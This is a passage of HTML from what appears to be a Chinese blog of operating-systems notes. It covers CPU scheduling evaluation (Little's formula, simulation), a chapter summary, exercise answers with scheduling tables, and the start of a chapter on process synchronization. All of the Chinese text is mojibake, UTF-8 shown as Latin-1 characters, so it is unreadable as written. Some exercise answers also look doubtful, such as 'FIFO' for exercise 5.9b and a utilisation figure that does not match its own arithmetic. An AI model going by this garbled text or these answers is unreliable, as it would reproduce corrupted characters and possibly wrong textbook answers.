è€Œä¸”å…¶ç­”æ¡ˆåªé€‚ç”¨äºè¿™äº›æƒ…å†µã€‚ç¡®å®šæ¨¡å‹çš„ä¸»è¦ç”¨é€”åœ¨äºæè¿°è°ƒåº¦ç®—æ³•å’Œæä¾›ä¾‹å­ã€‚</p><h3 id="572-æ’é˜Ÿæ¨¡å‹"><a class="markdownIt-Anchor" href="#572-æ’é˜Ÿæ¨¡å‹"></a> 5.7.2 æ’é˜Ÿæ¨¡å‹</h3><p>çŸ¥é“äº†åˆ°è¾¾ç‡å’ŒæœåŠ¡ç‡ï¼Œ å¯è®¡ç®—ä½¿ç”¨ç‡ã€å¹³å‡é˜Ÿåˆ—é•¿åº¦ã€å¹³å‡ç­‰å¾…æ—¶é—´ç­‰ã€‚è¿™ç§ç ”ç©¶ç§°ä¸ºæ’é˜Ÿç½‘ç»œåˆ†æï¼ˆqueueing-network analysisï¼‰ã€‚</p><p>ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œ è®¾nä¸ºå¹³å‡é˜Ÿåˆ—é•¿åº¦ï¼ˆä¸åŒ…æ‹¬æ­£åœ¨æœåŠ¡çš„è¿›ç¨‹ï¼‰ï¼Œ w ä¸ºé˜Ÿåˆ—çš„å¹³å‡ç­‰å¾…æ—¶é—´ï¼ŒAä¸ºæ–°è¿›ç¨‹åˆ°è¾¾é˜Ÿåˆ—çš„å¹³å‡åˆ°è¾¾ç‡ï¼ˆå¦‚æ¯ç§’ä¸‰ä¸ªè¿›ç¨‹ï¼‰ã€‚é‚£ä¹ˆï¼Œåœ¨è¿›ç¨‹ç­‰å¾…çš„Wæ—¶é—´å†…ï¼Œ åˆ™æœ‰Î» Ã—wä¸ªæ–°è¿›ç¨‹åˆ°è¾¾é˜Ÿåˆ—ã€‚å¦‚æœç³»ç»Ÿå¤„äºç¨³å®šçŠ¶æ€ï¼Œ é‚£ä¹ˆç¦»å¼€é˜Ÿåˆ—çš„è¿›ç¨‹çš„æ•°é‡å¿…é¡»ç­‰äºåˆ°è¾¾è¿›ç¨‹çš„æ•°é‡ã€‚</p><p>å› æ­¤ï¼Œ<strong>n ï¼ Î» Ã— W</strong><br>è¿™ä¸€å…¬å¼ç§°ä¸ºLittleå…¬å¼ã€‚Little å…¬å¼ç‰¹åˆ«æœ‰ç”¨ï¼Œ å› ä¸ºå®ƒé€‚ç”¨äºä»»ä½•è°ƒåº¦ç®—æ³•å’Œåˆ°è¾¾åˆ†å¸ƒã€‚</p><h3 id="573-æ¨¡æ‹Ÿ"><a class="markdownIt-Anchor" href="#573-æ¨¡æ‹Ÿ"></a> 5.7.3 æ¨¡æ‹Ÿ</h3><p>ä¸ºäº†è·å¾—æ›´ä¸ºç²¾ç¡®çš„è°ƒåº¦ç®—æ³•è¯„ä¼°ï¼Œ å¯ä½¿ç”¨æ¨¡æ‹Ÿï¼ˆsimulationï¼‰ã€‚æ¨¡æ‹Ÿæ¶‰åŠå¯¹è®¡ç®—æœºç³»ç»Ÿè¿›è¡Œå»ºæ¨¡ã€‚è½¯ä»¶æ•°æ®ç»“æ„è¡¨ç¤ºç³»ç»Ÿçš„ä¸»è¦ç»„æˆéƒ¨åˆ†ã€‚æ¨¡æ‹Ÿç¨‹åºæœ‰ä¸€ä¸ªå˜é‡ä»¥è¡¨ç¤ºæ—¶é’Ÿï¼›å½“è¯¥å˜é‡çš„å€¼å¢åŠ æ—¶ï¼Œ æ¨¡æ‹Ÿç¨‹åºä¼šä¿®æ”¹ç³»ç»ŸçŠ¶æ€ä»¥åæ˜ è®¾å¤‡ã€è¿›ç¨‹å’Œè°ƒåº¦ç¨‹åºçš„æ´»åŠ¨ã€‚éšç€æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œï¼Œ ç”¨ä»¥è¡¨ç¤ºç®—æ³•æ€§èƒ½çš„ç»Ÿè®¡æ•°å­—å¯ä»¥è¢«æ”¶é›†å¹¶æ‰“å°å‡ºæ¥ã€‚</p><h3 id="574-å®ç°"><a class="markdownIt-Anchor" href="#574-å®ç°"></a> 5.7.4 å®ç°</h3><p>é’ˆå¯¹è¯„ä¼°è°ƒåº¦ç®—æ³•ï¼Œ å”¯ä¸€å®Œå…¨ç²¾ç¡®çš„æ–¹æ³•æ˜¯å¯¹å®ƒè¿›è¡Œç¼–ç¨‹ï¼Œ å°†å®ƒæ”¾åœ¨æ“ä½œç³»ç»Ÿå†…ï¼Œ å¹¶è§‚æµ‹å®ƒå¦‚ä½•å·¥ä½œã€‚è¿™ä¸€æ–¹æ³•å°†çœŸå®ç®—æ³•æ”¾å…¥æ“ä½œç³»ç»Ÿï¼Œç„¶ååœ¨çœŸå®æ“ä½œç³»ç»Ÿå†…è¿›è¡Œè¯„ä¼°ã€‚</p><h2 id="58-å°ç»“"><a class="markdownIt-Anchor" href="#58-å°ç»“"></a> 5.8 å°ç»“</h2><p>CPU è°ƒåº¦çš„ä»»åŠ¡æ˜¯ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªç­‰å¾…è¿›ç¨‹ï¼Œå¹¶ä¸ºå…¶åˆ†é…CPUã€‚CPUç”±è°ƒåº¦ç¨‹åºåˆ†é…ç»™æ‰€é€‰ä¸­çš„è¿›ç¨‹ã€‚</p><p>å…ˆåˆ°å…ˆæœåŠ¡ï¼ˆFCFSï¼‰è°ƒåº¦æ˜¯æœ€ç®€å•çš„è°ƒåº¦ç®—æ³•ï¼Œä½†æ˜¯å®ƒä¼šè®©çŸ­è¿›ç¨‹ç­‰å¾…éå¸¸é•¿çš„è¿›ç¨‹ã€‚</p><p>æœ€çŸ­ä½œä¸šä¼˜å…ˆï¼ˆ SJF ï¼‰è°ƒåº¦å¯è¯æ˜æ˜¯æœ€ä½³çš„ï¼Œå®ƒæä¾›äº†æœ€çŸ­å¹³å‡ç­‰å¾…æ—¶é—´ã€‚å®ç°SJF è°ƒåº¦æ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºé¢„æµ‹ä¸‹ä¸€ä¸ªCPUåŒºé—´çš„é•¿åº¦æœ‰éš¾åº¦ã€‚SJFç®—æ³•æ˜¯é€šç”¨ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ï¼ˆå°†CPU ç®€å•åœ°åˆ†é…ç»™å…·æœ‰æœ€é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ã€‰çš„ç‰¹ä¾‹ã€‚ä¼˜å…ˆçº§å’ŒSJFè°ƒåº¦ä¼šäº§ç”Ÿé¥¥é¥¿ã€‚è€åŒ–æŠ€æœ¯å¯é˜»æ­¢é¥¥é¥¿ã€‚</p><p>è½®è½¬æ³•ï¼ˆRRï¼‰è°ƒåº¦å¯¹äºåˆ†æ—¶ï¼ˆäº¤äº’ã€‰ç³»ç»Ÿæ›´ä¸ºåˆé€‚ã€‚RRè°ƒåº¦è®©å°±ç»ªé˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨CPU çš„qä¸ªæ—¶é—´å•å…ƒï¼Œè¿™é‡Œqæ˜¯æ—¶é—´ç‰‡ã€‚åœ¨qæ—¶é—´å•å…ƒä¹‹åï¼Œå¦‚æœè¯¥è¿›ç¨‹è¿˜æ²¡æœ‰é‡Šæ”¾CPUï¼Œé‚£ä¹ˆå®ƒè¢«æŠ¢å å¹¶æ”¾åˆ°å°±ç»ªé˜Ÿåˆ—çš„å°¾éƒ¨ã€‚è¯¥ç®—æ³•çš„ä¸»è¦é—®é¢˜æ˜¯é€‰æ‹©æ—¶é—´ç‰‡ã€‚å¦‚æœæ—¶é—´ç‰‡å¤ªå¤§ï¼Œ é‚£ä¹ˆRRè°ƒåº¦å°±æˆäº†FCFSè°ƒåº¦ï¼›å¦‚æœæ—¶é—´ç‰‡å¤ªå°ï¼Œ é‚£ä¹ˆå› ä¸Šä¸‹æ–‡åˆ‡æ¢è€Œå¼•èµ·çš„è°ƒåº¦å¼€é”€å°±è¿‡å¤§ã€‚</p><p>FCFSç®—æ³•æ˜¯éæŠ¢å çš„ï¼Œè€ŒRRç®—æ³•æ˜¯æŠ¢å çš„ã€‚SJFå’Œä¼˜å…ˆçº§ç®—æ³•å¯ä»¥æ˜¯æŠ¢å çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éæŠ¢å çš„ã€‚</p><p>å¤šçº§é˜Ÿåˆ—è°ƒåº¦ç®—æ³•å…è®¸å¤šä¸ªä¸åŒç®—æ³•ç”¨äºå„ç§ç±»å‹çš„è¿›ç¨‹ã€‚æœ€ä¸ºå¸¸ç”¨çš„æ¨¡å‹åŒ…æ‹¬ä½¿ç”¨çœ¼è°ƒåº¦çš„å‰å°äº¤äº’é˜Ÿåˆ—ï¼Œä»¥åŠä½¿ç”¨FCFS è°ƒåº¦çš„åå°æ‰¹å¤„ç†é˜Ÿåˆ—ã€‚å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•å…è®¸è¿›ç¨‹åœ¨é˜Ÿåˆ—ä¹‹é—´è¿ç§»ã€‚</p><p>è®¸å¤šå½“å‰çš„è®¡ç®—æœºç³»ç»Ÿæ”¯æŒå¤šå¤„ç†å™¨ï¼Œ äº•å…è®¸æ¯ä¸ªå¤„ç†å™¨ç‹¬ç«‹åœ°è°ƒåº¦å®ƒè‡ªå·±ã€‚é€šå¸¸ï¼Œæ¯ä¸ªå¤„ç†å™¨ç»´æŠ¤è‡ªå·±çš„ç§æœ‰è¿›ç¨‹ï¼ˆæˆ–çº¿ç¨‹ï¼‰é˜Ÿåˆ—ï¼Œ å®ƒä»¬éƒ½å¯ä»¥è¿è¡Œã€‚ä¸å¤šå¤„ç†å™¨è°ƒåº¦ç›¸å…³<br>çš„é—®é¢˜åŒ…æ‹¬å¤„ç†å™¨äº²å’Œæ€§å’Œè´Ÿè½½å¹³è¡¡ã€‚</p><p>å¦‚æœæ“ä½œç³»ç»Ÿåœ¨å†…æ ¸çº§æ”¯æŒçº¿ç¨‹ï¼Œ é‚£ä¹ˆå¿…é¡»è°ƒåº¦çº¿ç¨‹è€Œä¸æ˜¯è¿›ç¨‹æ¥æ‰§è¡Œã€‚Solariså’ŒWindows XPå°±æ˜¯è¿™æ ·çš„ç³»ç»Ÿï¼Œ å®ƒä»¬é‡‡ç”¨æŠ¢å çš„ã€åŸºäºä¼˜å…ˆçº§çš„è°ƒåº¦ç®—æ³•ï¼Œ å¹¶æ”¯æŒå®æ—¶çº¿ç¨‹ã€‚Linuxè¿›ç¨‹è°ƒåº¦ä¹Ÿä½¿ç”¨åŸºäºä¼˜å…ˆçº§ç®—æ³•ï¼Œ å¹¶æä¾›å®æ—¶æ”¯æŒã€‚è¿™ä¸‰ç§æ“ä½œç³»ç»Ÿé€šå¸¸åçˆ±äº¤äº’è¿›ç¨‹è€Œä¸æ˜¯æ‰¹å¤„ç†è¿›ç¨‹æˆ–CPUçº¦æŸè¿›ç¨‹ã€‚</p><p>å› ä¸ºæœ‰å¤šç§ä¸åŒçš„è°ƒåº¦ç®—æ³•å¯ç”¨ï¼Œ æ‰€ä»¥éœ€è¦æŸç§æ–¹æ³•æ¥é€‰æ‹©å®ƒä»¬ã€‚åˆ†ææ–¹æ³•ä½¿ç”¨æ•°å­¦åˆ†æä»¥ç¡®å®šç®—æ³•æ€§èƒ½ã€‚æ¨¡æ‹Ÿæ–¹æ³•é€šè¿‡å¯¹ä»£è¡¨æ€§çš„è¿›ç¨‹é‡‡ç”¨è°ƒåº¦ç®—æ³•æ¨¡æ‹Ÿå¹¶è®¡ç®—å…¶æ€§èƒ½æ¥ç¡®å®šä¼˜åŠ£ã€‚ä¸è¿‡ï¼Œ æ¨¡æ‹Ÿæœ€å¤šä¹Ÿåªæ˜¯æä¾›å¯¹çœŸå®ç³»ç»Ÿæ€§èƒ½çš„è¿‘ä¼¼ï¼Œ è¯„ä¼°è°ƒåº¦ç®—æ³•å”¯ä¸€å¯é çš„æŠ€æœ¯æ˜¯åœ¨çœŸå®ç³»ç»Ÿä¸Šçš„å®ç°ç®—æ³•å¹¶åœ¨çœŸå®ç¯å¢ƒä¸­è¿›è¡Œæ€§èƒ½è·Ÿè¸ªã€‚</p><h2 id="59-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#59-ä¹ é¢˜"></a> 5.9 ä¹ é¢˜</h2><p><strong>5.1 ä¸ºä»€ä¹ˆå¯¹è°ƒåº¦ç¨‹åºæ¥è¯´ï¼ŒåŒºåˆ†I/Oé™åˆ¶çš„ç¨‹åºå’ŒCPU é™åˆ¶çš„ç¨‹åºæ˜¯é‡è¦çš„ï¼Ÿ</strong></p><blockquote><p>I/Oé™åˆ¶çš„ç¨‹åºæœ‰åœ¨è¿è¡ŒI/Oæ“ä½œå‰åªè¿è¡Œå¾ˆå°‘æ•°é‡çš„è®¡ç®—æœºæ“ä½œçš„æ€§è´¨ã€‚è¿™ç§ç¨‹åºä¸€èˆ¬æ¥è¯´ä¸ä¼šä½¿ç”¨å¾ˆå¤šçš„CPUã€‚ ä½†æ˜¯ CPU é™åˆ¶çš„ç¨‹åºä¼šåˆ©ç”¨æ•´ä¸ªçš„æ—¶é—´ç‰‡ï¼Œä¸”ä¸åšä»»ä½•é˜»ç¢I/Oæ“ä½œçš„å·¥ä½œã€‚</p><p>I/Oçº¦æŸç¨‹åºé€šå¸¸å…·æœ‰å¾ˆå¤šçŸ­CPUåŒºé—´ã€‚CPUçº¦æŸç¨‹åºå¯èƒ½æœ‰å°‘é‡çš„é•¿CPUåŒºé—´ã€‚</p><p>å› æ­¤ï¼Œé€šè¿‡ç»™I/Oé™åˆ¶çš„ç¨‹åºä¼˜å…ˆæƒå’Œå…è®¸åœ¨CPU é™åˆ¶çš„ç¨‹åºä¹‹å‰è¿è¡Œï¼Œ å¯ä»¥å¾ˆå¥½çš„åˆ©ç”¨è®¡ç®—æœºèµ„æº</p></blockquote><p><strong>5.4</strong></p><p><img src="/posts/8ce3e425/image-20211103122937119.png" alt="image-20211103122937119"></p><p><img src="/posts/8ce3e425/image-20211103122955012.png" alt="image-20211103122955012"></p><blockquote><p><strong>a. Ganttå›¾</strong></p><p><img src="/posts/8ce3e425/image-20211103130642240.png" alt="image-20211103130642240"></p><p><strong>b. å‘¨è½¬æ—¶é—´</strong></p><table><thead><tr><th></th><th style="text-align:center">FCFS</th><th style="text-align:center">SJF</th><th style="text-align:center">éæŠ¢å ä¼˜å…ˆçº§</th><th style="text-align:center">RR</th></tr></thead><tbody><tr><td>P<sub>1</sub></td><td style="text-align:center">10</td><td style="text-align:center">19</td><td style="text-align:center">16</td><td style="text-align:center">19</td></tr><tr><td>P<sub>2</sub></td><td style="text-align:center">11</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td>P<sub>3</sub></td><td style="text-align:center">13</td><td style="text-align:center">4</td><td style="text-align:center">18</td><td style="text-align:center">7</td></tr><tr><td>P<sub>4</sub></td><td style="text-align:center">14</td><td style="text-align:center">2</td><td style="text-align:center">19</td><td style="text-align:center">4</td></tr><tr><td>P<sub>5</sub></td><td style="text-align:center">19</td><td style="text-align:center">9</td><td style="text-align:center">6</td><td style="text-align:center">14</td></tr></tbody></table><p><strong>c. ç­‰å¾…æ—¶é—´</strong></p><table><thead><tr><th></th><th style="text-align:center">FCFS</th><th style="text-align:center">SJF</th><th style="text-align:center">éæŠ¢å ä¼˜å…ˆçº§</th><th style="text-align:center">RR</th></tr></thead><tbody><tr><td>P<sub>1</sub></td><td style="text-align:center">0</td><td style="text-align:center">9</td><td style="text-align:center">6</td><td style="text-align:center">9</td></tr><tr><td>P<sub>2</sub></td><td style="text-align:center">10</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td>P<sub>3</sub></td><td style="text-align:center">11</td><td style="text-align:center">2</td><td style="text-align:center">16</td><td style="text-align:center">5</td></tr><tr><td>P<sub>4</sub></td><td style="text-align:center">13</td><td style="text-align:center">1</td><td style="text-align:center">18</td><td style="text-align:center">3</td></tr><tr><td>P<sub>5</sub></td><td style="text-align:center">14</td><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">9</td></tr></tbody></table><p><strong>d.</strong> <strong>å¹³å‡ç­‰å¾…æ—¶é—´</strong></p><p>â€‹FCFS=(0+10+11+13+14)/5=48/5=9.6</p><p>â€‹SJF=(9+0+2+1+4)/5=3.2</p><p>â€‹éæŠ¢å ä¼˜å…ˆçº§=(6+0+16+18+2)/5=8.4</p><p>â€‹RR=(9+1+5+3+9)/5=5.4</p><p>â€‹å¹³å‡ç­‰å¾…æ—¶é—´æœ€çŸ­çš„æ˜¯SJFè°ƒåº¦ç®—æ³•ã€‚</p></blockquote><p><strong>5.5</strong></p><p><img src="/posts/8ce3e425/image-20211103123014862.png" alt="image-20211103123014862"></p><blockquote><p>bå’Œd.    æœ€çŸ­ä½œä¸šä¼˜å…ˆè°ƒåº¦å’Œä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•éƒ½ä¼šå¼•èµ·é¥¥é¥¿</p></blockquote><p><strong>5.7</strong></p><p><img src="/posts/8ce3e425/image-20211103123055446.png" alt="image-20211103123055446"></p><blockquote><p><strong>a. æ—¶é—´ç‰‡æ˜¯1msï¼š</strong></p><p>ä¸è®ºæ˜¯å“ªä¸ªè¿›ç¨‹è¢«è°ƒåº¦ï¼Œè¿™ä¸ªè°ƒåº¦éƒ½ä¼šä¸ºæ¯ä¸€æ¬¡çš„ä¸Šä¸‹æ–‡åˆ‡æ¢èŠ±è´¹ä¸€ä¸ª0.1msçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><p>CPUçš„åˆ©ç”¨ç‡æ˜¯1/1.1*100%=92%</p><p><strong>b. æ—¶é—´ç‰‡æ˜¯10ç§’ï¼š</strong></p><p>è¿™I/Oé™åˆ¶ä»»åŠ¡ä¼šåœ¨ä½¿ç”¨å®Œ1msæ—¶é—´ç‰‡åè¿›è¡Œä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚è¿™ä¸ªæ—¶é—´ç‰‡è¦æ±‚åœ¨æ‰€æœ‰çš„è¿›ç¨‹é—´éƒ½èµ°ä¸€éï¼Œå› æ­¤ï¼Œ10*1.1+10.1(å› ä¸ºæ¯ä¸ª1/0é™å®šä»»åŠ¡æ‰§è¡Œä¸º1æ¯«ç§’ï¼Œç„¶åæ‰¿æ‹…ä¸Šä¸‹æ–‡åˆ‡æ¢çš„ä»»åŠ¡ï¼Œè€ŒCPUé™åˆ¶ä»»åŠ¡çš„æ‰§è¡Œ10æ¯«ç§’åœ¨æ‰¿æ‹…ä¸€ä¸ªä¸Šä¸‹æ–‡åˆ‡æ¢ä¹‹å‰ï¼‰ã€‚</p><p>å› æ­¤ï¼ŒCPUçš„åˆ©ç”¨ç‡æ˜¯20/21.1*100=94%</p></blockquote><p>5.9 è€ƒè™‘ä¸‹é¢çš„åŠ¨æ€æ”¹å˜ä¼˜å…ˆçº§çš„æŠ¢å å¼ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ã€‚ å¤§çš„ä¼˜å…ˆçº§æ•°ä»£è¡¨é«˜ä¼˜å…ˆçº§ã€‚ å½“ä¸€ä¸ªè¿›ç¨‹åœ¨ç­‰å¾…CPUæ—¶ï¼ˆåœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œä½†æ²¡æ‰§è¡Œï¼‰ï¼Œ ä¼˜å…ˆçº§ä»¥Î±é€Ÿç‡æ”¹å˜ï¼š å½“å®ƒè¿è¡Œæ—¶ï¼Œä¼˜å…ˆçº§ä»¥Î²é€Ÿç‡æ”¹<br>å˜ã€‚ æ‰€æœ‰çš„è¿›ç¨‹åœ¨è¿›å…¥ç­‰å¾…é˜Ÿåˆ—æ—¶æŒ‡å®šä¼˜å…ˆçº§ä¸º0ã€‚ å‚æ•°Î±å’ŒÎ²å¯ä»¥è¿›è¡Œè®¾å®šå¾—åˆ°è®¸å¤šä¸åŒçš„è°ƒåº¦ç®—æ³•ã€‚<br>a. Î²&gt;Î±&gt;0æ˜¯ä»€ä¹ˆç®—æ³•ï¼Ÿ<br>b. Î±&lt;Î²&lt;0æ˜¯ä»€ä¹ˆç®—æ³•ï¼Ÿ</p><blockquote><p>a. FCFS</p><p>b. FIFO</p></blockquote><p><strong>5.11</strong></p><p><img src="/posts/8ce3e425/image-20211103123112891.png" alt="image-20211103123112891"></p><blockquote><p>a: 26</p><p>b: 8</p><p>c: 14</p></blockquote><p><strong>5.10 è§£é‡Šä¸‹é¢è°ƒåº¦ç®—æ³•å¯¹çŸ­è¿›ç¨‹åå¥½ç¨‹åº¦ä¸Šçš„åŒºåˆ«ï¼š</strong><br><strong>a. FCFS</strong><br><strong>b. RR</strong><br><strong>c. å¤šçº§åé¦ˆé˜Ÿåˆ—</strong></p><blockquote><p>a. FCFSä¸€ä¸€åŒºåˆ«çŸ­ä»»åŠ¡æ˜¯å› ä¸ºä»»ä½•åœ¨é•¿ä»»åŠ¡ä¹‹ååˆ°è¾¾çš„çŸ­ä»»åŠ¡éƒ¨å°†ä¼šæœ‰å¾ˆé•¿çš„ç­‰å¾…æ—¶é—´.<br>b. RRä¸€ä¸€å¯¹æ‰€æœ‰çš„ä»»åŠ¡éƒ½æ˜¯èƒ½å¤Ÿç›¸åŒçš„ï¼ˆç»™å®ƒä»¬ç›¸åŒçš„CPU æ—¶é—´åŒºé—´ï¼‰ï¼Œæ‰€ä»¥ï¼ŒçŸ­ä»»åŠ¡å¯ä»¥å¾ˆå¿«çš„ç¦»å¼€ç³»ç»Ÿï¼Œ åªè¦å®ƒä»¬å¯ä»¥å…ˆå®Œæˆï¼<br>c . å¤šçº§åé¦ˆé˜Ÿåˆ—å’ŒRR è°ƒåº¦ç®—æ³•ç›¸ä¼¼ä¸€ä¸€å®ƒä»¬ä¸ä¼šå…ˆé€‰æ‹©çŸ­ä»»åŠ¡ã€‚</p></blockquote><h1 id="ç¬¬6ç« è¿›ç¨‹åŒæ­¥"><a class="markdownIt-Anchor" href="#ç¬¬6ç« è¿›ç¨‹åŒæ­¥"></a> ç¬¬6ç« è¿›ç¨‹åŒæ­¥</h1><h2 id="61-èƒŒæ™¯"><a class="markdownIt-Anchor" href="#61-èƒŒæ™¯"></a> 6.1 èƒŒæ™¯</h2><p>å…è®¸ä¸¤ä¸ªè¿›ç¨‹å¹¶å‘æ“ä½œå˜é‡counterä¼šå¾—åˆ°ä¸æ­£ç¡®çš„çŠ¶æ€ã€‚</p><p>å¤šä¸ªè¿›ç¨‹å¹¶å‘è®¿é—®å’Œæ“ä½œåŒä¸€æ•°æ®ä¸”æ‰§è¡Œç»“æœä¸è®¿é—®å‘ç”Ÿçš„ç‰¹å®šé¡ºåºæœ‰å…³ï¼Œ ç§°ä¸ºç«äº‰æ¡ä»¶ï¼ˆrace conditionï¼‰ã€‚ä¸ºäº†é¿å…ç«äº‰æ¡ä»¶ï¼Œ éœ€è¦ç¡®ä¿ä¸€æ®µæ—¶é—´å†…åªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½æ“ä½œå˜é‡counterã€‚ä¸ºäº†å®ç°è¿™ç§ä¿è¯ï¼Œ è¦æ±‚è¿›è¡Œä¸€å®šå½¢å¼çš„è¿›ç¨‹åŒæ­¥ã€‚</p><h2 id="62-ä¸´ç•ŒåŒºé—®é¢˜"><a class="markdownIt-Anchor" href="#62-ä¸´ç•ŒåŒºé—®é¢˜"></a> 6.2 ä¸´ç•ŒåŒºé—®é¢˜</h2><p>æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªä»£ç æ®µç§°ä¸º<strong>ä¸´ç•ŒåŒº</strong>ï¼ˆcritical sectionï¼‰ï¼Œ åœ¨è¯¥åŒºä¸­è¿›ç¨‹å¯èƒ½æ”¹å˜å…±åŒå˜é‡ã€æ›´æ–°ä¸€ä¸ªè¡¨ã€å†™ä¸€ä¸ªæ–‡ä»¶ç­‰ã€‚</p><p>è¿™ç§ç³»ç»Ÿçš„<strong>é‡è¦ç‰¹å¾</strong>æ˜¯å½“ä¸€ä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼Œ æ²¡æœ‰å…¶ä»–è¿›ç¨‹å¯è¢«å…è®¸åœ¨ä¸´ç•ŒåŒºå†…æ‰§è¡Œï¼Œ å³æ²¡æœ‰ä¸¤ä¸ªè¿›ç¨‹å¯åŒæ—¶åœ¨ä¸´ç•ŒåŒºå†…æ‰§è¡Œã€‚</p><p><strong>ä¸´ç•ŒåŒºé—®é¢˜</strong>(critical-section problem ï¼‰ æ˜¯è®¾è®¡ä¸€ä¸ªä»¥ä¾¿è¿›ç¨‹åä½œçš„åè®®ã€‚æ¯ä¸ªè¿›ç¨‹å¿…é¡»è¯·æ±‚å…è®¸è¿›å…¥å…¶<strong>ä¸´ç•ŒåŒº</strong>ã€‚å®ç°è¿™ä¸€è¯·æ±‚çš„ä»£ç æ®µç§°ä¸º<strong>è¿›å…¥åŒº</strong>ï¼ˆentry sectionï¼‰ï¼Œ ä¸´ç•ŒåŒºä¹‹åå¯æœ‰<strong>é€€å‡ºåŒº</strong>ï¼ˆexit sectionï¼‰ï¼Œ å…¶ä»–ä»£ç ä¸ºå‰©ä½™åŒºï¼ˆremainder sectionï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20211116161533895.png" alt="image-20211116161533895"></p><p>ä¸´ç•ŒåŒºé—®é¢˜çš„è§£ç­”å¿…é¡»æ»¡è¶³å¦‚ä¸‹ä¸‰é¡¹è¦æ±‚ï¼š</p><ul><li><p><strong>äº’æ–¥</strong>ï¼ˆmutual exclusionï¼‰ï¼š å¦‚æœè¿›ç¨‹P<sub>i</sub>åœ¨å…¶ä¸´ç•ŒåŒºå†…æ‰§è¡Œï¼Œ é‚£ä¹ˆå…¶ä»–è¿›ç¨‹éƒ½ä¸èƒ½åœ¨å…¶ä¸´ç•ŒåŒºå†…æ‰§è¡Œã€‚</p></li><li><p><strong>æœ‰ç©ºè®©è¿›</strong>ï¼ˆprogressï¼‰ï¼š å¦‚æœæ²¡æœ‰è¿›ç¨‹åœ¨å…¶ä¸´ç•ŒåŒºå†…æ‰§è¡Œï¼Œä¸”æœ‰è¿›ç¨‹éœ€è¿›å…¥ä¸´ç•ŒåŒºï¼Œé‚£ä¹ˆåªæœ‰é‚£äº›ä¸åœ¨å‰©ä½™åŒºå†…æ‰§è¡Œçš„è¿›ç¨‹å¯å‚åŠ é€‰æ‹©ï¼Œ ä»¥ç¡®å®šè°èƒ½ä¸‹ä¸€ä¸ªè¿›å…¥ä¸´ç•ŒåŒºï¼Œ ä¸”è¿™ç§é€‰æ‹©ä¸èƒ½æ— é™æ¨è¿Ÿã€‚</p><p>å½“æ²¡æœ‰è¿›ç¨‹åœ¨äº’æ–¥åŒºæ—¶ï¼Œä»»ä½•æœ‰æƒä½¿ç”¨äº’æ–¥åŒºçš„è¿›ç¨‹å¯è¿›å…¥ã€‚</p></li><li><p><strong>æœ‰é™ç­‰å¾…</strong>(bounded waitingï¼‰ï¼šä»»ä½•è¿›å…¥äº’æ–¥åŒºçš„è¦æ±‚åº”åœ¨æœ‰é™çš„æ—¶é—´å†…å¾—åˆ°æ»¡è¶³.</p></li></ul><h2 id="63-petersonç®—æ³•"><a class="markdownIt-Anchor" href="#63-petersonç®—æ³•"></a> 6.3 Petersonç®—æ³•</h2><p>å˜é‡ turnè¡¨ç¤ºå“ªä¸ªè¿›ç¨‹å¯ä»¥è¿›å…¥å…¶ä¸´ç•ŒåŒºã€‚å³å¦‚æœ turn==iï¼Œ é‚£ä¹ˆè¿›ç¨‹ P<sub>i</sub>å…è®¸åœ¨å…¶ä¸´ç•ŒåŒºå†…æ‰§è¡Œã€‚æ•°ç»„ flag è¡¨ç¤ºå“ªä¸ªè¿›ç¨‹æƒ³è¦è¿›å…¥å…¶ä¸´ç•ŒåŒºã€‚</p><p><img src="/posts/8ce3e425/image-20211116161739706.png" alt="image-20211116161739706"></p><h2 id="630-é¢åŒ…å¸ˆç®—æ³•"><a class="markdownIt-Anchor" href="#630-é¢åŒ…å¸ˆç®—æ³•"></a> 6.3.0 é¢åŒ…å¸ˆç®—æ³•</h2><p>é¢åŒ…å¸ˆç®—æ³•æ˜¯nä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºé—®é¢˜çš„ç®—æ³•</p><ul><li>åœ¨è¿›å…¥ä¸´ç•ŒåŒºå‰ï¼Œè¿›ç¨‹æ¥æ”¶ä¸€ä¸ªæ•°å­—ï¼Œæœ€å°æ•°å­—çš„æŒæœ‰è€…è¿›å…¥ä¸´ç•ŒåŒº</li><li>å¦‚æœPiå’ŒPjæ¥æ”¶åˆ°äº†åŒæ ·çš„æ•°å­—ï¼Œè€Œä¸”å¦‚æœi &lt; jï¼Œé‚£ä¹ˆPi å…ˆå¾—åˆ°æœåŠ¡ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20211116161850602.png" alt="image-20211116161850602"></p><p><img src="/posts/8ce3e425/image-20211116161908057.png" alt="image-20211116161908057"></p><h2 id="64-ç¡¬ä»¶åŒæ­¥"><a class="markdownIt-Anchor" href="#64-ç¡¬ä»¶åŒæ­¥"></a> 6.4 ç¡¬ä»¶åŒæ­¥</h2><p><strong>TestAndSet()</strong></p><p><img src="/posts/8ce3e425/image-20220109162023500.png" 